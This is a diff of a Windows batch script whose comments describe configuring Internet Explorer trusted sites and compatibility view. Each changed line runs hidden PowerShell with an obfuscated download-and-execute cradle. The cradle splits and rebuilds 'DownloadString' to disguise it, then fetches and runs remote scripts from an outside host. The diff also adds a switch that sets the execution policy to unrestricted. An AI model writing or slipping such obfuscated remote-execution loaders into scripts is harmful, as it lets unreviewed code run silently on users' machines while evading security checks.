@@ -69,12 +69,12 @@ if %J_Status% EQU 0 (
 
 :PrimaryIESettings
 rem 调用主机powershell脚本，添加可信站点，兼容性视图
-call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
+call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
 goto exit
 
 :IESettings
 rem 调用副机powershell脚本，添加可信站点，兼容性视图
-call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
+call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
 goto exit
 
 :exit
